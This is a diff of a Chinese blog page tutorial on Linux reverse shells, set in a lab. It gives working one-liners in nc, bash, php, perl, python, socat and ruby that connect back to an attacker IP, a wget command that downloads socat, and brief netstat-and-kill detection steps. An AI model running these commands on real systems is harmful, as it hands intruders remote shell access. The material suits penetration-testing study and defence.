@@ -401,8 +401,8 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h1><p>Attacker：192.168.0.106 win10</p>
-<p>Victim：192.168.2.140 kali</p>
+        <h1 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Attacker：192.168.0.106 win10</span><br><span class="line"></span><br><span class="line">Victim：192.168.2.140 kali</span><br></pre></td></tr></table></figure>
+
 <h1 id="NC-反弹-shell"><a href="#NC-反弹-shell" class="headerlink" title="NC 反弹 shell"></a>NC 反弹 shell</h1><h2 id="Netcat简介"><a href="#Netcat简介" class="headerlink" title="Netcat简介"></a>Netcat简介</h2><p>俗称瑞士军刀或NC，小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接地或容易地驱动。</p>
 <p>同时，nc又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。渗透测试中，linux主机一般自带nc，Windows主机需要自行上传。</p>
 <h2 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h2><p>如果目标主机（受害机）支持“-e”选项的话，我们就可以直接进行利用。</p>
@@ -428,39 +428,39 @@ height:50vh;
 <p>使用管道符 | 连接nc的输出与bash的输入，使用自己创建的管道 backpipe连接/bin/bash的输出与nc的输入。<br>优点：适用于nc的 -e参数被禁。<br>缺点：会在当前目录下创建一个名为backpipe的管道文件,容易被管理员发现。</p>
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803225119466-806042970.png" alt="img"></p>
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803225140476-1059069133.png" alt="img"></p>
-<h1 id="bash-反弹-shell"><a href="#bash-反弹-shell" class="headerlink" title="bash 反弹 shell"></a>bash 反弹 shell</h1><h3 id="Attack监听"><a href="#Attack监听" class="headerlink" title="Attack监听"></a>Attack监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+<h1 id="bash-反弹-shell"><a href="#bash-反弹-shell" class="headerlink" title="bash 反弹 shell"></a>bash 反弹 shell</h1><h2 id="Attack监听"><a href="#Attack监听" class="headerlink" title="Attack监听"></a>Attack监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
 
-<h3 id="Victim反弹"><a href="#Victim反弹" class="headerlink" title="Victim反弹"></a>Victim反弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.106&#x2F;8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h2 id="Victim反弹"><a href="#Victim反弹" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.106&#x2F;8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p>ps：</p>
 <p>bash -i是打开一个交互的bash。</p>
 <p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p>
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803225933802-1604055523.png" alt="img"></p>
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803230001657-136512534.png" alt="img"></p>
-<h1 id="php-反弹-shell"><a href="#php-反弹-shell" class="headerlink" title="php 反弹 shell"></a>php 反弹 shell</h1><h3 id="Attack监听-1"><a href="#Attack监听-1" class="headerlink" title="Attack监听"></a>Attack监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+<h1 id="php-反弹-shell"><a href="#php-反弹-shell" class="headerlink" title="php 反弹 shell"></a>php 反弹 shell</h1><h2 id="Attack监听-1"><a href="#Attack监听-1" class="headerlink" title="Attack监听"></a>Attack监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
 
-<h3 id="Victim反弹-1"><a href="#Victim反弹-1" class="headerlink" title="Victim反弹"></a>Victim反弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,4444);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="Victim反弹-1"><a href="#Victim反弹-1" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,4444);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
 
 
 
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803230313719-128280629.png" alt="img"></p>
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803230334565-2008400817.png" alt="img"></p>
-<h1 id="perl-反弹-shell"><a href="#perl-反弹-shell" class="headerlink" title="perl 反弹 shell"></a>perl 反弹 shell</h1><h3 id="Attack监听-2"><a href="#Attack监听-2" class="headerlink" title="Attack监听"></a>Attack监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+<h1 id="perl-反弹-shell"><a href="#perl-反弹-shell" class="headerlink" title="perl 反弹 shell"></a>perl 反弹 shell</h1><h2 id="Attack监听-2"><a href="#Attack监听-2" class="headerlink" title="Attack监听"></a>Attack监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
 
-<h3 id="Victim反弹-2"><a href="#Victim反弹-2" class="headerlink" title="Victim反弹"></a>Victim反弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.0.106&quot;;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.0.106&quot;;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="Victim反弹-2"><a href="#Victim反弹-2" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.0.106&quot;;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.0.106&quot;;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
 
-<h1 id="python-反弹-shell"><a href="#python-反弹-shell" class="headerlink" title="python 反弹 shell"></a>python 反弹 shell</h1><h3 id="Attack监听-3"><a href="#Attack监听-3" class="headerlink" title="Attack监听"></a>Attack监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure>
+<h1 id="python-反弹-shell"><a href="#python-反弹-shell" class="headerlink" title="python 反弹 shell"></a>python 反弹 shell</h1><h2 id="Attack监听-3"><a href="#Attack监听-3" class="headerlink" title="Attack监听"></a>Attack监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure>
 
-<h3 id="Victim反弹-3"><a href="#Victim反弹-3" class="headerlink" title="Victim反弹"></a>Victim反弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="Victim反弹-3"><a href="#Victim反弹-3" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
 
 
 
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803230802388-750267960.png" alt="img"></p>
 <p>ps：python2/3</p>
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803230927537-338885821.png" alt="img"></p>
-<h1 id="socat-反弹-shell"><a href="#socat-反弹-shell" class="headerlink" title="socat 反弹 shell"></a>socat 反弹 shell</h1><h3 id="Attack监听-4"><a href="#Attack监听-4" class="headerlink" title="Attack监听"></a>Attack监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>
+<h1 id="socat-反弹-shell"><a href="#socat-反弹-shell" class="headerlink" title="socat 反弹 shell"></a>socat 反弹 shell</h1><h2 id="Attack监听-4"><a href="#Attack监听-4" class="headerlink" title="Attack监听"></a>Attack监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>
 
-<h3 id="Victim反弹-4"><a href="#Victim反弹-4" class="headerlink" title="Victim反弹"></a>Victim反弹</h3><p>下载socat到/tmp目录下</p>
+<h2 id="Victim反弹-4"><a href="#Victim反弹-4" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><p>下载socat到/tmp目录下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https:&#x2F;&#x2F;github.com&#x2F;andrew-d&#x2F;static-binaries&#x2F;raw&#x2F;master&#x2F;binaries&#x2F;linux&#x2F;x86_64&#x2F;socat -O &#x2F;tmp&#x2F;socat</span><br></pre></td></tr></table></figure>
 
 <p>给socat授予可以执行权限</p>
@@ -469,16 +469,14 @@ height:50vh;
 <p>反弹shell到目标主机的12345端口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.0.106:12345</span><br></pre></td></tr></table></figure>
 
-<h1 id="ruby-反弹-shell"><a href="#ruby-反弹-shell" class="headerlink" title="ruby 反弹 shell"></a>ruby 反弹 shell</h1><h3 id="Attack监听-5"><a href="#Attack监听-5" class="headerlink" title="Attack监听"></a>Attack监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure>
+<h1 id="ruby-反弹-shell"><a href="#ruby-反弹-shell" class="headerlink" title="ruby 反弹 shell"></a>ruby 反弹 shell</h1><h2 id="Attack监听-5"><a href="#Attack监听-5" class="headerlink" title="Attack监听"></a>Attack监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure>
 
-<h3 id="Victim反弹-5"><a href="#Victim反弹-5" class="headerlink" title="Victim反弹"></a>Victim反弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;192.168.0.106&quot;,5555).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="Victim反弹-5"><a href="#Victim反弹-5" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;192.168.0.106&quot;,5555).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure>
 
-<h1 id="排查-amp-杀掉反弹-shell"><a href="#排查-amp-杀掉反弹-shell" class="headerlink" title="排查&amp;杀掉反弹 shell"></a>排查&amp;杀掉反弹 shell</h1><h3 id="Search-Command"><a href="#Search-Command" class="headerlink" title="Search Command"></a>Search Command</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→ ∮ ← :~# netstat -anop | grep ESTABLISHED</span><br></pre></td></tr></table></figure>
-
-
+<h1 id="排查-amp-杀掉反弹-shell"><a href="#排查-amp-杀掉反弹-shell" class="headerlink" title="排查&amp;杀掉反弹 shell"></a>排查&amp;杀掉反弹 shell</h1><h2 id="Search-Command"><a href="#Search-Command" class="headerlink" title="Search Command"></a>Search Command</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→ ∮ ← :~# netstat -anop | grep ESTABLISHED</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/1594459-20190803233143410-1258882915.png" alt="img"></p>
-<h3 id="Kill-Command"><a href="#Kill-Command" class="headerlink" title="Kill Command"></a>Kill Command</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 4065</span><br></pre></td></tr></table></figure>
+<h2 id="Kill-Command"><a href="#Kill-Command" class="headerlink" title="Kill Command"></a>Kill Command</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 4065</span><br></pre></td></tr></table></figure>
 
 
     </article>
@@ -488,7 +486,7 @@ height:50vh;
             <p>Author：<a href="http://Qftm.github.io">Qftm</a>
             <p>原文链接：<a href="http://qftm.github.io/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/">http://qftm.github.io/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/</a>
             <p>发表日期：<a href="http://qftm.github.io/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/">August 3rd 2019, 11:16:00 pm</a>
-            <p>更新日期：<a href="http://qftm.github.io/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/">March 12th 2020, 9:49:33 am</a>
+            <p>更新日期：<a href="http://qftm.github.io/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/">April 8th 2020, 2:47:18 am</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -629,7 +627,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击场景"><span class="toc-number">1.</span> <span class="toc-text">攻击场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC-反弹-shell"><span class="toc-number">2.</span> <span class="toc-text">NC 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat简介"><span class="toc-number">2.1.</span> <span class="toc-text">Netcat简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#姿势一"><span class="toc-number">2.2.</span> <span class="toc-text">姿势一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#姿势二"><span class="toc-number">2.3.</span> <span class="toc-text">姿势二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bash-反弹-shell"><span class="toc-number">3.</span> <span class="toc-text">bash 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack监听"><span class="toc-number">3.0.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Victim反弹"><span class="toc-number">3.0.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-反弹-shell"><span class="toc-number">4.</span> <span class="toc-text">php 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack监听-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Victim反弹-1"><span class="toc-number">4.0.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#perl-反弹-shell"><span class="toc-number">5.</span> <span class="toc-text">perl 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack监听-2"><span class="toc-number">5.0.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Victim反弹-2"><span class="toc-number">5.0.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-反弹-shell"><span class="toc-number">6.</span> <span class="toc-text">python 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack监听-3"><span class="toc-number">6.0.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Victim反弹-3"><span class="toc-number">6.0.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#socat-反弹-shell"><span class="toc-number">7.</span> <span class="toc-text">socat 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack监听-4"><span class="toc-number">7.0.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Victim反弹-4"><span class="toc-number">7.0.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ruby-反弹-shell"><span class="toc-number">8.</span> <span class="toc-text">ruby 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack监听-5"><span class="toc-number">8.0.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Victim反弹-5"><span class="toc-number">8.0.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#排查-amp-杀掉反弹-shell"><span class="toc-number">9.</span> <span class="toc-text">排查&amp;杀掉反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Search-Command"><span class="toc-number">9.0.1.</span> <span class="toc-text">Search Command</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kill-Command"><span class="toc-number">9.0.2.</span> <span class="toc-text">Kill Command</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击场景"><span class="toc-number">1.</span> <span class="toc-text">攻击场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC-反弹-shell"><span class="toc-number">2.</span> <span class="toc-text">NC 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat简介"><span class="toc-number">2.1.</span> <span class="toc-text">Netcat简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#姿势一"><span class="toc-number">2.2.</span> <span class="toc-text">姿势一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#姿势二"><span class="toc-number">2.3.</span> <span class="toc-text">姿势二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bash-反弹-shell"><span class="toc-number">3.</span> <span class="toc-text">bash 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack监听"><span class="toc-number">3.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Victim反弹"><span class="toc-number">3.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-反弹-shell"><span class="toc-number">4.</span> <span class="toc-text">php 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack监听-1"><span class="toc-number">4.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Victim反弹-1"><span class="toc-number">4.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#perl-反弹-shell"><span class="toc-number">5.</span> <span class="toc-text">perl 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack监听-2"><span class="toc-number">5.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Victim反弹-2"><span class="toc-number">5.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-反弹-shell"><span class="toc-number">6.</span> <span class="toc-text">python 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack监听-3"><span class="toc-number">6.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Victim反弹-3"><span class="toc-number">6.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#socat-反弹-shell"><span class="toc-number">7.</span> <span class="toc-text">socat 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack监听-4"><span class="toc-number">7.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Victim反弹-4"><span class="toc-number">7.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ruby-反弹-shell"><span class="toc-number">8.</span> <span class="toc-text">ruby 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack监听-5"><span class="toc-number">8.1.</span> <span class="toc-text">Attack监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Victim反弹-5"><span class="toc-number">8.2.</span> <span class="toc-text">Victim反弹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#排查-amp-杀掉反弹-shell"><span class="toc-number">9.</span> <span class="toc-text">排查&amp;杀掉反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Search-Command"><span class="toc-number">9.1.</span> <span class="toc-text">Search Command</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kill-Command"><span class="toc-number">9.2.</span> <span class="toc-text">Kill Command</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1907,11 +1905,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
+        <span class="sidebar-tag-name" data-tags="神兵利器"><span class="iconfont-archer">&#xe606;</span>神兵利器</span>
+    
         <span class="sidebar-tag-name" data-tags="ARP"><span class="iconfont-archer">&#xe606;</span>ARP</span>
     
         <span class="sidebar-tag-name" data-tags="协议"><span class="iconfont-archer">&#xe606;</span>协议</span>
-    
-        <span class="sidebar-tag-name" data-tags="神兵利器"><span class="iconfont-archer">&#xe606;</span>神兵利器</span>
     
         <span class="sidebar-tag-name" data-tags="AWD"><span class="iconfont-archer">&#xe606;</span>AWD</span>
     
@@ -1920,6 +1918,8 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="安卓开发"><span class="iconfont-archer">&#xe606;</span>安卓开发</span>
     
         <span class="sidebar-tag-name" data-tags="Apple"><span class="iconfont-archer">&#xe606;</span>Apple</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
         <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
     
@@ -1941,15 +1941,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Handbook"><span class="iconfont-archer">&#xe606;</span>Handbook</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
-    
         <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
     
         <span class="sidebar-tag-name" data-tags="Bypass"><span class="iconfont-archer">&#xe606;</span>Bypass</span>
     
